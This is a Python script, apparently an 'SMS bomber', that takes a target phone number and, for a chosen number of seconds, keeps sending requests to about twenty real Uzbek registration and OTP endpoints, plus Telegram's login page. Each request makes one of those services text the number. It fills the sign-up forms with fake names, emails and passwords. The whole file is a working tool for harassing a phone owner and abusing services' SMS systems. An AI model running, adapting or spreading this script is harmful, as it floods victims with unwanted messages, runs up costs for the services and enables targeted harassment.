import requests
import json
import time
import bs4
import colorama
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True) 

mynumber = input('\033[91m' 'enter number + (998xxxxxxxxx)-->>  ')
CLOSE_AFTER = int(input("enter time in seconds -->>  "  )) 
safia = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
farm = '+'+mynumber[0:3]+' ' '('+mynumber[3:5]+')'+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
invest = mynumber[3:12]
express = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12] 
technomart = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
outlas = mynumber[3:12]
creditasia = mynumber[4:4]+'('+mynumber[5:7]+')'+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
creditasiapas = '+'+mynumber[0:3]+' ' '('+mynumber[3:5]+')'+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]

start_time = time.time()
while True :
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 try:
    requests.get('https://mato.uz/index.php?', params={
'dispatch': 'profiles.cp_phone_verification',
'otp_type': 'register',
'obj_id': '',
'phone': mynumber,
'result_ids': 'phone_verification_',
'skip_result_ids_check': 'true',
'is_ajax': '1'} )
    print('\033[1;32m''sms sent!')
 except:
    print('Error mato')
 if time.time() > start_time + float(CLOSE_AFTER): exit()
  
 try:
    requests.post('https://api.zor.uz/user/registration', data={'phone': invest} )
    print('\033[1;32m''sms sent!')
 except:
    print('Error elbozor')
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    requests.post('https://api.webpos.uz/api/client/sendsms', json={"phoneNumber": mynumber}  )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    requests.post('https://safiabakery.uz/ajax/check-phone', data={'SignupForm[phone]': safia} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity:authBySMS&action=checkPhone', data={'phone': farm} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.insurance.uz/api/code', data={'phone': invest} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.express24.uz/client/v4/authentication/code', json={'phone': express} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://io.bellissimo.uz/api/verify', data={'phone': '+'+ mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://bizzon.uz/kuponator&api=send_reg_confirm_sms', data={'phone': '+'+ mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://api.bringo.uz/api/v1/register/phone', json={'phone': mynumber} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://glotr.uz/user/ru/registration-as-user/', data={'RegistrationForm[first_name]': 'WILLIAM', 'RegistrationForm[phone_number]': '+'+ mynumber, 'RegistrationForm[privacy_policy]': '1'} )
    print ('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://my.telegram.org/auth/send_password', data={'phone': '+'+ mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:

    requests.post('https://api.brandstore.uz/api/auth/code/create/', data={"phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://www.creditasia.uz/personal/registration/', data={"reg": "reg", "family": "William", "username": "John", "phone": creditasia})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
	
 try:
    
    requests.post('https://www.creditasia.uz/personal/registration/', data={"pSend": "pSend", "phone": creditasiapas})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://greyder.uz/register/form', data={"profile[firstName]": "Test", "profile[lastName]": "william", "profile[phoneNumber]": mynumber, "password[first]": "pokiuj22fdfc", "password[second]": "pokiuj22fdfc"})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://kittek.uz/local/ajax/common.php', data={"handler": "AuthAjaxHandler", "func": "registrationStepOne", "phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://mobile.olcha.uz/api/v2/sendsms', data={"phone": mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    requests.post('https://sello.uz/api/market/user/sign-up',  json={"phone": mynumber,"password":"qazwsxedc","password_repeat":"qazwsxedc"} )
    print('\033[1;32m''sms sent!')
 except:
     print('ERROR')
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://postavshik.korzinka.uz/api/auth/send-otp', json={"phone": '+'+ mynumber, "email": "ivanichl1970@rambler.ru", "login": "ivanovich22qq29"} )
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
    
 if time.time() > start_time + float(CLOSE_AFTER): exit()

 try:
    
    requests.post('https://customer.api.delever.uz/v1/customers/register', headers={"shipper": "36b00947-ad7a-40eb-b7ca-1c0ea267f2ac"}, json={"phone": '+'+ mynumber,"registration_source":"website"}  )
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')

 if time.time() > start_time + float(CLOSE_AFTER): exit()
 
 try:
    
    requests.post('https://client.api.rasta.app/v1/customers/register', json={"name":"Testq","phone": '+'+ mynumber,"code":"","registration_source":"website"}  )
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')

 if time.time() > start_time + float(CLOSE_AFTER): exit()

 try:
    
    requests.post('https://backend.texnomart.uz/api/v1/user/register', json={"phone": technomart, "first_name":"William", "last_name":"Johns"})
    print('\033[1;32m''sms sent!')
 except:
	 print('ERROR')
 # # created by https://github.com/database-max/spbmr
